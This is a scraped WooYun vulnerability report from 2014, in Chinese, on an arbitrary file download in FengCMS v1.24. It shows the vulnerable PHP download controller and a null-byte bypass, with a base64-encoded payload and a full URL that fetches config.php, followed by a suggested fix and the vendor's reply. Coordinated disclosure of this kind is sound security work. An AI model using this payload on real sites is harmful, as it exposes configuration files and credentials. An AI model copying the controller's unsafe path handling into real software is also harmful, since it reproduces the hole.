{"id": 53111, "wybug_id": "wooyun-2014-068781", "wybug_title": "Fengcms 最新版v1.24任意文件下载(绕过过滤)", "wybug_corp": "fengcms.com", "wybug_author": "phith0n", "wybug_date": "2014-07-16 21:33", "wybug_open_date": "2014-10-14 21:34", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向公众公开  简要描述： 之前fengcms修复了好几次这个问题，但依旧知识不对。不过到我这个应该就终结了，我会给出好的解决方案。这也不是厂商的问题，如果不是专门搞安全的人也很难考虑到这一点。多说一句，fengcms送的礼物已经收到了，再次感谢！这种厂商要奖励，很负责！！官方给出的测试站已经升到最新版了，我这里测试通过，已经可以下载config.php。 详细说明：  /app/controller/downController.php：\nclass downController extends Controller{\tpublic function index(){\t\t$_GET['file']=base64_decode($_GET['file']);\t\t$_GET['file']=str_replace(\"..\",\"\",$_GET['file']);\t\t$exp=explode(\"/\",$_GET['file']);\t\tif($exp[1]==\"upload\"){\t\t\tif(file_exists(ROOT_PATH.$_GET['file'])){\t\t\t\t\t\t\theader(\"Content-Type: application/force-download\");\t\t\t\theader(\"Content-Disposition: attachment; filename=\".basename($_GET['file'])); \t\t\t\treadfile(ROOT_PATH.$_GET['file']);\t\t\t}else{\t\t\t\techo '<script type=\"text/javascript\">alert(\"您要下载的文件不存在！\");history.back();</script>';\t\t\t}\t\t}else{\t\t\t\techo '<script type=\"text/javascript\">alert(\"您要下载的文件不存在！\");history.back();</script>';\t\t}\t}}\n看他是怎么处理的：1.base64_decode解码2.过滤..为空3.将$_GET['file']用/分割成$exp，并取第二个（$exp[1]），判断$exp[1]是否等于upload，等于才允许下载4.将root_path和$_GET['file']组合成绝对路径，下载文件如何绕过过滤，答案是\\0截断。首先，不管有没有全局addslashes或GPC，base64_decode就能无视之，引入一个\\0，进行截断。因为代码里取得是$exp[1]判断是否是\"upload\"，所以我们可以把要下载的文件内容写在$exp[0]里，之后用\\0截断掉，readfile的时候就能够把我要的config.php下载下来了。所以罪魁祸首还是root_path是网站根目录，如果root_path是/upload目录的话，我想要下载config.php的话就必须要用../跳转到上层目录。使用%00截断的条件是php版本小于5.3.4(左右吧，记不得)，而官方给的测试站正好是5.2.x，所以可以通过测试，下载config.php。   漏洞证明：  首先测试一下之前的/upload/../config.php还能不能下载：\n\n果断不能了。。。那么将file改成这样：\necho base64_encode(\"\\\\config.php\\x00/upload\");\n也就是：http://guf521656.h163.92hezu.org/?controller=down&file=XGNvbmZpZy5waHAAL3VwbG9hZA访问发现可以继续文件下载：\n\n这是下载到的config.php：\n\n   修复方案：  获得file的代码加一个addslashes，过滤%00截断。$_GET['file']=addslashes(base64_decode($_GET['file']));   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-17 11:02 厂商回复： 非常感谢！这个漏洞已经困扰我们很久了，没想到都这样了还能被破解，在安全的道路上真的是永无终点啊！非常感谢！我们立即着手安排程序员处理这个问题！再一次感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-17 00:28 |    \t\tVigoss_Z \t\t\t( 普通白帽子  |\t\t\t        Rank:404 漏洞数:63        | 楞娃)\t\t \n  额,求带!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}